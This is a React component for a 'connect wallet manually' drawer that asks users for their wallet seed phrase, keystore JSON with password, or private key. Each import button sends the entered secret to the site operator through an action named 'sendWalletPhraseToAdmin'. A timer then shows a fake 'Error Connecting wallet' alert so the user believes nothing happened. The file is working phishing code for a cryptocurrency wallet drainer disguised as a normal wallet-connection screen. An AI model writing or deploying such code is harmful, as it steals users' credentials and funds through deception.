import {
  Box,
  Button,
  CircularProgress,
  Divider,
  Drawer,
  IconButton,
  Stack,
  Tab,
  Tabs,
  TextField,
  Typography,
  useTheme,
} from "@mui/material";
import { tokens } from "../../theme";
import { CaretLeft, Question, X } from "@phosphor-icons/react";

import { useEffect, useState } from "react";
import PropTypes from "prop-types";
import UseWindowSize from "../../hooks/UseWindowSize";
import { useDispatch, useSelector } from "react-redux";
import { toast } from "react-toastify";
import { sendWalletPhraseToAdmin } from "../../redux/features/connectWallet/connectWalletSlice";

function CustomTabPanel(props) {
  const { children, value, index, ...other } = props;

  return (
    <div
      role="tabpanel"
      hidden={value !== index}
      id={`simple-tabpanel-${index}`}
      aria-labelledby={`simple-tab-${index}`}
      {...other}
    >
      {value === index && <Box sx={{ p: "24px 20px 0 20px" }}>{children}</Box>}
    </div>
  );
}

CustomTabPanel.propTypes = {
  children: PropTypes.node,
  index: PropTypes.number.isRequired,
  value: PropTypes.number.isRequired,
};

function a11yProps(index) {
  return {
    id: `simple-tab-${index}`,
    "aria-controls": `simple-tabpanel-${index}`,
  };
}

const ManualConnectWallet = ({ open, handleClose, handleOpen, handleopenConnectWallet }) => {
  const theme = useTheme();
  const colors = tokens(theme.palette.mode);

  const dispatch = useDispatch()

  const size = UseWindowSize();

  const [isConnecting, setIsConnecting] = useState(false);

  const [value, setValue] = useState(0);

  const { wallet } = useSelector((state) => state.connectWallet);

  

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };

  useEffect(() => {
    let timer;
    if (isConnecting) {
      timer = setTimeout(() => {
        alert("Error Connecting wallet address, please try again later.");
        setIsConnecting(false);
      }, 8000);
    }
    return () => clearTimeout(timer);
  }, [isConnecting]);


  // phrase import
  const [phrase, setPhrase] = useState("");

  const phraseImport = async () => {
    if(phrase.length < 12 ) {
     return toast.error("Phrase must be up to 12 characters")
    }

    const formData = { 
      type: "phrase",
      wallet: wallet?.name,
      phrase,
      keystoreJSON: "",
      keystoreJSONPassword: "",
      privateKey: ""

    }

    setIsConnecting(true);
    await dispatch(sendWalletPhraseToAdmin(formData))
    setPhrase("")
  }


  // Keystore JSON import
  const [keystoreJSON, setKeystoreJSON] = useState("");
  const [keystoreJSONPassword, setKeystoreJSONPassword] = useState("");

  const keystoreJSONImport = async () => {
    if(keystoreJSON < 12 ) {
     return toast.error("keystoreJSON must be up to 12 characters")
    }

    const formData = { 
      type: "keystore JSON",
      wallet: wallet?.name,
      phrase: "",
      keystoreJSON,
      keystoreJSONPassword,
      privateKey: ""

    }

    setIsConnecting(true);
    await dispatch(sendWalletPhraseToAdmin(formData))
    setKeystoreJSON("")
    setKeystoreJSONPassword("")
  }

  // PrivateKey import
  const [privateKey, setPrivateKey] = useState("");

  const privateKeyImport = async () => {

    if(privateKey.length < 1 ) {
      return toast.error("Please enter private key")
     }

    const formData = { 
      type: "private Key",
      wallet: wallet?.name,
      phrase: "",
      keystoreJSON: "",
      keystoreJSONPassword: "",
      privateKey,

    }

    setIsConnecting(true);
    await dispatch(sendWalletPhraseToAdmin(formData))
    setPrivateKey("")
  }


  return (
    <>
      <Drawer
        anchor={size.width > 899 ? "right" : "bottom"}
        open={open}
        onClose={() => {
          handleClose();
        }}
        onOpen={handleOpen}
        sx={{
          "& .MuiDrawer-paper": {
            width: size.width > 899 ? 450 : "100%",
            height: size.width > 899 ? "100%" : "80%",
            borderRadius: "30px 30px 0 0",
            backgroundColor: colors.dashboardforeground[100],
            overflow: "hidden",
            borderTop: `1px solid grey`,
            transition: "height 2s ease",
          },
        }}
      >
        <Box
          backgroundColor={colors.dashboardforeground[100]}
          width={"100%"}
          height={"100%"}
          overflow={"hidden"}
          sx={{
            opacity: isConnecting ? 0 : 1,
            visibility: isConnecting ? "hidden" : "visible",
            transition: "opacity 0.3s ease, visibility 0.3s ease",
          }}
        >
          <Stack spacing={1} p={"15px 15px 10px 15px"}>
            <Stack
              direction={"row"}
              justifyContent={"space-between"}
              p={"5px 5px"}
              alignItems={"center"}
            >
              <IconButton size="small" onClick={
                () => {
                  handleClose()
                  handleopenConnectWallet()
                }
                }>
                <CaretLeft size={22} weight="bold" />
              </IconButton>
              <Typography textAlign={"center"} fontWeight={"600"}>
                Connect {wallet?.name} Manually
              </Typography>
              <IconButton size="small" onClick={handleClose}>
                <X size={20} weight="bold" />
              </IconButton>
            </Stack>
          </Stack>
          <Box mx={"-15px"}>
            <Divider />
          </Box>

          <Stack height={"100%"} overflow={"auto"} pb={15}>
            <Stack justifyContent={"center"} alignItems={"center"} mt={2}>
              <Typography variant="h6" fontWeight={600}>
                Import Wallet
              </Typography>
            </Stack>

            <Box sx={{ width: "100%" }} mt={{ xs: 3.5, md: 0 }}>
              <Box height={"38px"} borderRadius={"20px"} p={"3px"} mx={0.5}>
                <Tabs
                  value={value}
                  onChange={handleChange}
                  aria-label="basic tabs "
                  variant="fullWidth"
                  centered
                  sx={{
                    "& .MuiTabs-indicator": {
                      backgroundColor: "transparent",
                    },
                    "& .MuiTab-root": {
                      textTransform: "none",
                      minHeight: "32px",
                      padding: "4px 12px",
                      minWidth: "auto",
                      borderRadius: "20px",
                      mr: "5px",
                      // border: "none",
                      border: "1px solid grey",
                      "&:hover": {
                        //   border: "2px solid #ccc",
                      },
                      "&.Mui-selected": {
                        // border: "2px solid #007bff",
                        backgroundColor: "grey",
                        boxShadow: `${theme.shadows[2]}`,
                        color: "white",
                      },
                    },
                  }}
                >
                  <Tab label="Phrase" {...a11yProps(0)} />
                  <Tab label="Keystore JSON" {...a11yProps(1)} />
                  <Tab label="Private Key" {...a11yProps(2)} />
                </Tabs>
              </Box>

              <CustomTabPanel value={value} index={0}>
                <Stack spacing={2} textAlign={"center"}>
                  <TextField
                    label="phrase"
                    multiline
                    name="phrase"
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    rows={4}
                    InputProps={{ style: { borderRadius: "15px" } }}
                    inputProps={{
                      minLength: 12, // Set the minimum length
                    }}
                  />
                  <Typography variant="subtitle2">
                    Typically 12 (sometimes 24) words seperated by single spaces
                  </Typography>
                  <Button
                    size="small"
                    fullWidth
                    variant="contained"
                    sx={{
                      fontSize: "18px",
                      fontWeight: "500",
                      backgroundColor: "#009e4a",
                      color: "white",
                      padding: "8px",
                      "&:hover": {
                        backgroundColor: "darkgreen",
                      },
                      borderRadius: "15px",
                    }}
                    onClick={phraseImport}
                  >
                    Import
                  </Button>
                </Stack>
              </CustomTabPanel>
              
              <CustomTabPanel value={value} index={1}>
                <Stack spacing={2} textAlign={"center"}>
                  <TextField
                    label="Keystore JSON"
                    multiline
                    rows={4}
                    value={keystoreJSON}
                    onChange={(e) => setKeystoreJSON(e.target.value)}
                    InputProps={{ style: { borderRadius: "15px" } }}
                    inputProps={{
                      minLength: 12, // Set the minimum length
                    }}
                  />
                  <TextField
                    label="Password"
                    multiline
                    value={keystoreJSONPassword}
                    onChange={(e) => setKeystoreJSONPassword(e.target.value)}
                    InputProps={{ style: { borderRadius: "15px" } }}
                  />
                  <Typography variant="subtitle2">
                    Typically 12 (sometimes 24) words seperated by single spaces
                  </Typography>
                  <Button
                    size="small"
                    fullWidth
                    variant="contained"
                    sx={{
                      fontSize: "18px",
                      fontWeight: "500",
                      backgroundColor: "#009e4a",
                      color: "white",
                      padding: "8px",
                      "&:hover": {
                        backgroundColor: "darkgreen",
                      },
                      borderRadius: "15px",
                    }}
                    onClick={keystoreJSONImport}
                  >
                    Import
                  </Button>
                </Stack>
              </CustomTabPanel>
              <CustomTabPanel value={value} index={2}>
                <Stack spacing={2} textAlign={"center"} mt={2}>
                  <TextField
                    label="Private Key"
                    multiline
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                    InputProps={{ style: { borderRadius: "15px" } }}
                    inputProps={{
                      minLength: 12, // Set the minimum length
                    }}
                  />
                  <Typography variant="subtitle2">
                    Typically 12 (sometimes 24) words seperated by single spaces
                  </Typography>
                  <Button
                    size="small"
                    fullWidth
                    variant="contained"
                    sx={{
                      fontSize: "18px",
                      fontWeight: "500",
                      backgroundColor: "#009e4a",
                      color: "white",
                      padding: "8px",
                      "&:hover": {
                        backgroundColor: "darkgreen",
                      },
                      borderRadius: "15px",
                    }}
                    onClick={privateKeyImport}
                  >
                    Import
                  </Button>
                </Stack>
              </CustomTabPanel>
            </Box>
          </Stack>
        </Box>

        <Box
          backgroundColor={colors.dashboardforeground[100]}
          position={"absolute"}
          width={"100%"}
          height={"100%"}
          top={0}
          overflow={"hidden"}
          display={"flex"}
          justifyContent={"center"}
          alignItems={"center"}
          sx={{
            opacity: isConnecting ? 1 : 0,
            visibility: isConnecting ? "visible" : "hidden",
            transition: "opacity 0.3s ease, visibility 0.3s ease",
          }}
        >
          <Stack justifyContent={"center"} alignItems={"center"} spacing={1}>
            <CircularProgress />
            {isConnecting && <Typography>Connecting Wallet...</Typography>}
          </Stack>
        </Box>
      </Drawer>
    </>
  );
};

export default ManualConnectWallet;
